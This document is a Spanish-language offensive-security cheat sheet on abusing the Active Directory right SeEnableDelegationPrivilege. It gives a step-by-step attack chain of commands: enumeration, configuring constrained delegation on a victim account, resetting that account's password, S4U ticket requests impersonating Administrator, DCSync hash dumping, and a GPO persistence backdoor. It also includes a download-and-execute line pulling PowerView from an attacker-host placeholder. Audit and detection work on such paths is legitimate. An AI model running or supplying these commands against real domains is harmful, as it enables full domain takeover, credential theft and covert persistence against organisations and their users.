## SeEnableDelegationPrivilege

Considerado por harmj0y como **"el derecho de usuario más peligroso del que probablemente nunca has oído hablar"**. Permite modificar los atributos de delegación Kerberos de cualquier objeto del dominio — incluyendo `msDS-AllowedToDelegateTo` y los flags `TRUSTED_FOR_DELEGATION` / `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`.

Solo es relevante en **Domain Controllers** — en estaciones de trabajo y servidores miembro no tiene efecto. Por defecto, únicamente `BUILTIN\Administrators` (Domain Admins / Enterprise Admins) lo tiene asignado.

### Verificar el privilegio

```cmd
whoami /priv
```

Buscar en la salida:

```
SeEnableDelegationPrivilege    Enable computer and user accounts to be trusted for delegation    Enabled
```

---

## Por qué es tan peligroso

Si un usuario controlado por el atacante tiene `SeEnableDelegationPrivilege` **y** tiene `GenericAll` o `GenericWrite` sobre cualquier otro objeto del dominio, puede:

1. Configurar **Constrained Delegation** en ese objeto apuntando al servicio `ldap/<DC>`
2. Solicitar tickets S4U2Self + S4U2Proxy impersonando a Administrator
3. Ejecutar **DCSync** usando el ticket obtenido — extrayendo todos los hashes del dominio

El resultado es **compromiso total y persistente del dominio** desde una cuenta no privilegiada.

---

## Enumeración — quién tiene el privilegio

### Desde Linux

```shell
# Via netexec — buscar usuarios con este derecho en el DC
nxc ldap <ip_dc> -u <usuario> -p <contraseña> --privilege SeEnableDelegationPrivilege

# Via bloodyAD — leer la GPO del DC (Default Domain Controllers Policy)
bloodyAD --host <ip_dc> -d <dominio> -u <usuario> -p <contraseña> \
  get object "Default Domain Controllers Policy" --attr gPCMachineExtensionNames
```

### Desde Windows con PowerView

```powershell
# Comprobar qué usuarios tienen SeEnableDelegationPrivilege via GPO del DC
Get-DomainPolicy -Source DC | Select-Object -ExpandProperty PrivilegeRights | \
  Select-Object SeEnableDelegationPrivilege

# Alternativa — leer la GPO directamente
# GUID de Default Domain Controllers Policy
$GPOPath = "\\<dominio>\sysvol\<dominio>\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
Get-Content $GPOPath | Select-String "SeEnableDelegationPrivilege"
```

---

## Explotación — flujo completo

### Prerrequisitos

- Usuario controlado con `SeEnableDelegationPrivilege`
- Ese usuario tiene `GenericAll` / `GenericWrite` sobre algún objeto del dominio

### Paso 1 — Configurar Constrained Delegation sobre un usuario víctima

```powershell
# Cargar PowerView
IEX (new-object net.webclient).downloadstring('http://<ip_atacante>/powerview.ps1')

# Asignar el flag TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION al usuario víctima
Set-DomainObject -Identity <usuario_victima> \
  -XOR @{useraccountcontrol=16777216}

# Configurar msDS-AllowedToDelegateTo apuntando al LDAP del DC
Set-DomainObject -Identity <usuario_victima> \
  -Set @{'msds-allowedtodelegateto'='ldap/<dc>.<dominio>'}
```

### Paso 2 — Obtener la contraseña del usuario víctima (si no se conoce)

```powershell
# Con GenericAll podemos cambiarla a un valor conocido
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <usuario_victima> -AccountPassword $NewPassword
```

### Paso 3 — Solicitar ticket S4U impersonando a Administrator

```shell
# Desde Linux con getST.py
getST.py -spn ldap/<dc>.<dominio> \
  -impersonate administrator \
  -dc-ip <ip_dc> \
  '<dominio>/<usuario_victima>:Password123!'

export KRB5CCNAME=administrator.ccache
```

```powershell
# Desde Windows con Rubeus
.\Rubeus.exe s4u /user:<usuario_victima> /rc4:<hash_nt_victima> \
  /impersonateuser:administrator \
  /msdsspn:ldap/<dc>.<dominio> /ptt
```

### Paso 4 — DCSync con el ticket obtenido

```shell
# Desde Linux
secretsdump.py -k -no-pass '<dominio>/administrator'@<dc>.<dominio>

# Desde Windows con Mimikatz (tras inyectar el ticket)
lsadump::dcsync /domain:<dominio> /all
```

---

## Backdoor vía GPO (persistencia)

Si se tiene acceso de escritura a la **Default Domain Controllers Policy** aunque sea por unos minutos, se puede añadir cualquier usuario al privilegio de forma persistente:

```
# Ruta de la GPO del DC
\\<dominio>\sysvol\<dominio>\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf

# Añadir en la sección [Privilege Rights]:
SeEnableDelegationPrivilege = *S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX-XXXX
```

El cambio se aplica en el siguiente refresco de GPO del DC (`gpupdate /force` o tras reinicio).

---

## Detectar quién puede abusar de este privilegio en BloodHound

Buscar los siguientes edges combinados:

```
Usuario → [GenericAll/GenericWrite] → Cualquier objeto
         +
Usuario → [SeEnableDelegationPrivilege en el DC]
```

Si ambas condiciones se cumplen en el mismo usuario → compromiso total del dominio.

---

> ⚠️ `SeEnableDelegationPrivilege` no aparece en BloodHound como un edge directo — es un privilegio de GPO, no un DACL. Hay que buscarlo manualmente en la política del DC o con `Get-DomainPolicy -Source DC` en PowerView. Es uno de los vectores más ignorados en auditorías de AD precisamente por esto.

---

### Referencias

- https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/
- https://www.thehacker.recipes/ad/movement/kerberos/delegations
- https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html
- https://labs.withsecure.com/publications/trust-years-to-earn-seconds-to-break
